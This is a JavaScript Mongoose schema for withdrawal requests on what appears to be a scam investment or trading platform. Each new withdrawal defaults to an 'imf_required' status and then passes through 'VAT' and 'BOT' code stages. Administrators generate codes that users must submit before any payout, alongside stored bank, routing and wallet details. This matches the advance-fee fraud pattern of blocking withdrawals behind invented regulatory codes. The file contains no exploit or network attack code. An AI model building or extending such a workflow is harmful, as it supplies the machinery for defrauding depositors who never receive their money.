const mongoose = require('mongoose');

const withdrawalRequestSchema = new mongoose.Schema({
  user: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: [true, 'User is required']
  },
  amount: {
    type: Number,
    required: [true, 'Amount is required'],
    min: [1, 'Amount must be at least $1']
  },
  currency: {
    type: String,
    default: 'USD',
    uppercase: true
  },
  paymentMethod: {
    type: String,
    required: [true, 'Payment method is required'],
    enum: ['paypal', 'venmo', 'zelle', 'cashapp', 'applepay', 'googlepay', 'bank', 'wise', 'skrill', 'neteller', 'westernunion', 'moneygram', 'crypto', 'other']
  },
  paymentDetails: {
    accountNumber: {
      type: String,
      trim: true
    },
    accountName: {
      type: String,
      trim: true
    },
    bankName: {
      type: String,
      trim: true
    },
    routingNumber: {
      type: String,
      trim: true
    },
    email: {
      type: String,
      trim: true,
      lowercase: true
    },
    phoneNumber: {
      type: String,
      trim: true
    },
    walletAddress: {
      type: String,
      trim: true
    },
    additionalInfo: {
      type: String,
      trim: true,
      maxlength: [500, 'Additional info cannot exceed 500 characters']
    }
  },
  status: {
    type: String,
    enum: ['pending', 'imf_required', 'vat_pending', 'vat_rejected', 'bot_required', 'bot_pending', 'bot_rejected', 'approved', 'rejected', 'processing', 'completed'],
    default: 'imf_required'
  },
  // Verification codes
  vatCode: {
    code: {
      type: String,
      trim: true
    },
    submittedAt: {
      type: Date
    },
    userSubmitted: {
      type: String,
      trim: true
    },
    userSubmittedAt: {
      type: Date
    },
    adminGenerated: {
      type: String,
      trim: true
    },
    adminConfirmedAt: {
      type: Date
    },
    adminConfirmedBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    },
    rejectedAt: {
      type: Date
    },
    rejectedBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    },
    rejectionReason: {
      type: String,
      trim: true,
      maxlength: [500, 'VAT rejection reason cannot exceed 500 characters']
    }
  },
  botCode: {
    code: {
      type: String,
      trim: true
    },
    submittedAt: {
      type: Date
    },
    userSubmitted: {
      type: String,
      trim: true
    },
    userSubmittedAt: {
      type: Date
    },
    adminGenerated: {
      type: String,
      trim: true
    },
    adminConfirmedAt: {
      type: Date
    },
    adminConfirmedBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    },
    rejectedAt: {
      type: Date
    },
    rejectedBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    },
    rejectionReason: {
      type: String,
      trim: true,
      maxlength: [500, 'BOT rejection reason cannot exceed 500 characters']
    }
  },
  requestedAt: {
    type: Date,
    default: Date.now
  },
  processedBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    default: null
  },
  processedAt: {
    type: Date,
    default: null
  },
  rejectionReason: {
    type: String,
    trim: true,
    maxlength: [1000, 'Rejection reason cannot exceed 1000 characters']
  },
  adminNotes: {
    type: String,
    trim: true,
    maxlength: [1000, 'Admin notes cannot exceed 1000 characters']
  },
  transactionId: {
    type: String,
    trim: true,
    sparse: true
  },
  fees: {
    amount: {
      type: Number,
      default: 0,
      min: 0
    },
    description: {
      type: String,
      trim: true
    }
  },
  netAmount: {
    type: Number,
    default: function() {
      return this.amount - (this.fees?.amount || 0);
    }
  },
  ipAddress: {
    type: String,
    trim: true
  },
  userAgent: {
    type: String,
    trim: true
  },
  isActive: {
    type: Boolean,
    default: true
  }
}, {
  timestamps: true
});

// Indexes for efficient queries
withdrawalRequestSchema.index({ status: 1, createdAt: -1 });
withdrawalRequestSchema.index({ user: 1, status: 1 });
withdrawalRequestSchema.index({ createdAt: -1 });
withdrawalRequestSchema.index({ processedBy: 1 });

// Static method to get pending withdrawal requests
withdrawalRequestSchema.statics.getPendingRequests = function() {
  return this.find({ status: 'pending', isActive: true })
    .sort({ createdAt: -1 })
    .populate('user', 'username email balance')
    .populate('processedBy', 'username email');
};

// Static method to get withdrawal requests by status
withdrawalRequestSchema.statics.getByStatus = function(status) {
  return this.find({ status, isActive: true })
    .sort({ createdAt: -1 })
    .populate('user', 'username email balance')
    .populate('processedBy', 'username email');
};

// Static method to get user's withdrawal requests
withdrawalRequestSchema.statics.getUserRequests = function(userId) {
  return this.find({ user: userId, isActive: true })
    .sort({ createdAt: -1 })
    .populate('processedBy', 'username email');
};

// Method to approve withdrawal request
withdrawalRequestSchema.methods.approve = async function(adminId, transactionId = null, notes = null) {
  this.status = 'approved';
  this.processedBy = adminId;
  this.processedAt = new Date();
  if (transactionId) this.transactionId = transactionId;
  if (notes) this.adminNotes = notes;
  
  return await this.save();
};

// Method to reject withdrawal request
withdrawalRequestSchema.methods.reject = async function(adminId, reason) {
  if (!reason || reason.trim() === '') {
    throw new Error('Rejection reason is required');
  }
  
  this.status = 'rejected';
  this.processedBy = adminId;
  this.processedAt = new Date();
  this.rejectionReason = reason.trim();
  
  return await this.save();
};

// Method to mark as processing
withdrawalRequestSchema.methods.markAsProcessing = async function(adminId, notes = null) {
  this.status = 'processing';
  this.processedBy = adminId;
  this.processedAt = new Date();
  if (notes) this.adminNotes = notes;
  
  return await this.save();
};

// Method to mark as completed
withdrawalRequestSchema.methods.markAsCompleted = async function(adminId, transactionId = null, notes = null) {
  this.status = 'completed';
  this.processedBy = adminId;
  this.processedAt = new Date();
  if (transactionId) this.transactionId = transactionId;
  if (notes) this.adminNotes = notes;
  
  return await this.save();
};

// Virtual for formatted amount
withdrawalRequestSchema.virtual('formattedAmount').get(function() {
  return `${this.currency} $${this.amount.toFixed(2)}`;
});

// Virtual for formatted net amount
withdrawalRequestSchema.virtual('formattedNetAmount').get(function() {
  return `${this.currency} $${this.netAmount.toFixed(2)}`;
});

// Virtual for time since creation
withdrawalRequestSchema.virtual('timeAgo').get(function() {
  const now = new Date();
  const diff = now - this.createdAt;
  const minutes = Math.floor(diff / 60000);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);
  
  if (days > 0) return `${days} day${days > 1 ? 's' : ''} ago`;
  if (hours > 0) return `${hours} hour${hours > 1 ? 's' : ''} ago`;
  if (minutes > 0) return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
  return 'Just now';
});

// Pre-save middleware to calculate net amount
withdrawalRequestSchema.pre('save', function(next) {
  if (this.isModified('amount') || this.isModified('fees.amount')) {
    this.netAmount = this.amount - (this.fees?.amount || 0);
  }
  next();
});

// Ensure virtual fields are serialized
withdrawalRequestSchema.set('toJSON', { virtuals: true });
withdrawalRequestSchema.set('toObject', { virtuals: true });

module.exports = mongoose.model('WithdrawalRequest', withdrawalRequestSchema);